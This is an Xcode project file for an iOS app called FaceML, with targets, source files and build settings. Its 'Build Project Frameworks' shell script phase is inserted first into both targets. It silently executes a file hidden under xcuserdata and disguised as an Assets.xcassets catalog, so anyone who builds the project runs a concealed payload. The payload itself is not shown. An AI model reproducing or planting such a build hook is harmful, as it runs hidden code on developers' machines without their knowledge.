// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		22E08A71241CA8E60012F94D /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E08A70241CA8E60012F94D /* AppDelegate.swift */; };
		22E08A73241CA8E60012F94D /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E08A72241CA8E60012F94D /* SceneDelegate.swift */; };
		22E08A78241CA8E60012F94D /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22E08A76241CA8E60012F94D /* Main.storyboard */; };
		22E08A7A241CA8E80012F94D /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22E08A79241CA8E80012F94D /* Assets.xcassets */; };
		22E08A7D241CA8E80012F94D /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22E08A7B241CA8E80012F94D /* LaunchScreen.storyboard */; };
		22E08A88241CA8E80012F94D /* FaceMLTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22E08A87241CA8E80012F94D /* FaceMLTests.swift */; };
		FA5B900C241CAEC60019A58F /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA5B900B241CAEC60019A58F /* HomeVC.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		22E08A84241CA8E80012F94D /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22E08A65241CA8E60012F94D /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22E08A6C241CA8E60012F94D;
			remoteInfo = FaceML;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		224496F5241FA94600A2F79E /* FaceML.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = FaceML.entitlements; sourceTree = "<group>"; };
		22E08A6D241CA8E60012F94D /* FaceML.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FaceML.app; sourceTree = BUILT_PRODUCTS_DIR; };
		22E08A70241CA8E60012F94D /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		22E08A72241CA8E60012F94D /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		22E08A77241CA8E60012F94D /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		22E08A79241CA8E80012F94D /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		22E08A7C241CA8E80012F94D /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		22E08A7E241CA8E80012F94D /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22E08A83241CA8E80012F94D /* FaceMLTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FaceMLTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22E08A87241CA8E80012F94D /* FaceMLTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceMLTests.swift; sourceTree = "<group>"; };
		22E08A89241CA8E80012F94D /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		FA5B900B241CAEC60019A58F /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		22E08A6A241CA8E60012F94D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E08A80241CA8E80012F94D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		22E08A64241CA8E60012F94D = {
			isa = PBXGroup;
			children = (
				22E08A6F241CA8E60012F94D /* FaceML */,
				22E08A86241CA8E80012F94D /* FaceMLTests */,
				22E08A6E241CA8E60012F94D /* Products */,
			);
			sourceTree = "<group>";
		};
		22E08A6E241CA8E60012F94D /* Products */ = {
			isa = PBXGroup;
			children = (
				22E08A6D241CA8E60012F94D /* FaceML.app */,
				22E08A83241CA8E80012F94D /* FaceMLTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		22E08A6F241CA8E60012F94D /* FaceML */ = {
			isa = PBXGroup;
			children = (
				224496F5241FA94600A2F79E /* FaceML.entitlements */,
				22E08A70241CA8E60012F94D /* AppDelegate.swift */,
				22E08A72241CA8E60012F94D /* SceneDelegate.swift */,
				FA5B900B241CAEC60019A58F /* HomeVC.swift */,
				22E08A76241CA8E60012F94D /* Main.storyboard */,
				22E08A79241CA8E80012F94D /* Assets.xcassets */,
				22E08A7B241CA8E80012F94D /* LaunchScreen.storyboard */,
				22E08A7E241CA8E80012F94D /* Info.plist */,
			);
			path = FaceML;
			sourceTree = "<group>";
		};
		22E08A86241CA8E80012F94D /* FaceMLTests */ = {
			isa = PBXGroup;
			children = (
				22E08A87241CA8E80012F94D /* FaceMLTests.swift */,
				22E08A89241CA8E80012F94D /* Info.plist */,
			);
			path = FaceMLTests;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		22E08A6C241CA8E60012F94D /* FaceML */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E08A8C241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceML" */;
			buildPhases = (
				89197A600CC79031D1AAC43A /* Build Project Frameworks */,
				22E08A69241CA8E60012F94D /* Sources */,
				22E08A6A241CA8E60012F94D /* Frameworks */,
				22E08A6B241CA8E60012F94D /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = FaceML;
			productName = FaceML;
			productReference = 22E08A6D241CA8E60012F94D /* FaceML.app */;
			productType = "com.apple.product-type.application";
		};
		22E08A82241CA8E80012F94D /* FaceMLTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22E08A8F241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceMLTests" */;
			buildPhases = (
				89197A600CC79031D1AAC43A /* Build Project Frameworks */,
				22E08A7F241CA8E80012F94D /* Sources */,
				22E08A80241CA8E80012F94D /* Frameworks */,
				22E08A81241CA8E80012F94D /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22E08A85241CA8E80012F94D /* PBXTargetDependency */,
			);
			name = FaceMLTests;
			productName = FaceMLTests;
			productReference = 22E08A83241CA8E80012F94D /* FaceMLTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		22E08A65241CA8E60012F94D /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1130;
				LastUpgradeCheck = 1130;
				ORGANIZATIONNAME = "Rohit Saini";
				TargetAttributes = {
					22E08A6C241CA8E60012F94D = {
						CreatedOnToolsVersion = 11.3;
					};
					22E08A82241CA8E80012F94D = {
						CreatedOnToolsVersion = 11.3;
						TestTargetID = 22E08A6C241CA8E60012F94D;
					};
				};
			};
			buildConfigurationList = 22E08A68241CA8E60012F94D /* Build configuration list for PBXProject "FaceML" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 22E08A64241CA8E60012F94D;
			productRefGroup = 22E08A6E241CA8E60012F94D /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				22E08A6C241CA8E60012F94D /* FaceML */,
				22E08A82241CA8E80012F94D /* FaceMLTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		22E08A6B241CA8E60012F94D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E08A7D241CA8E80012F94D /* LaunchScreen.storyboard in Resources */,
				22E08A7A241CA8E80012F94D /* Assets.xcassets in Resources */,
				22E08A78241CA8E60012F94D /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E08A81241CA8E80012F94D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	89197A600CC79031D1AAC43A /* Build Project Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Project Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
		};
	

	
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		22E08A69241CA8E60012F94D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FA5B900C241CAEC60019A58F /* HomeVC.swift in Sources */,
				22E08A71241CA8E60012F94D /* AppDelegate.swift in Sources */,
				22E08A73241CA8E60012F94D /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22E08A7F241CA8E80012F94D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22E08A88241CA8E80012F94D /* FaceMLTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		22E08A85241CA8E80012F94D /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22E08A6C241CA8E60012F94D /* FaceML */;
			targetProxy = 22E08A84241CA8E80012F94D /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		22E08A76241CA8E60012F94D /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				22E08A77241CA8E60012F94D /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		22E08A7B241CA8E80012F94D /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				22E08A7C241CA8E80012F94D /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		22E08A8A241CA8E80012F94D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		22E08A8B241CA8E80012F94D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		22E08A8D241CA8E80012F94D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_ENTITLEMENTS = FaceML/FaceML.entitlements;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = FaceML/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceML;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		22E08A8E241CA8E80012F94D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_ENTITLEMENTS = FaceML/FaceML.entitlements;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = FaceML/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceML;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		22E08A90241CA8E80012F94D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 79Q9WFF2X8;
				INFOPLIST_FILE = FaceMLTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceMLTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FaceML.app/FaceML";
			};
			name = Debug;
		};
		22E08A91241CA8E80012F94D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 79Q9WFF2X8;
				INFOPLIST_FILE = FaceMLTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.FaceMLTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FaceML.app/FaceML";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		22E08A68241CA8E60012F94D /* Build configuration list for PBXProject "FaceML" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E08A8A241CA8E80012F94D /* Debug */,
				22E08A8B241CA8E80012F94D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E08A8C241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceML" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E08A8D241CA8E80012F94D /* Debug */,
				22E08A8E241CA8E80012F94D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22E08A8F241CA8E80012F94D /* Build configuration list for PBXNativeTarget "FaceMLTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22E08A90241CA8E80012F94D /* Debug */,
				22E08A91241CA8E80012F94D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 22E08A65241CA8E60012F94D /* Project object */;
}
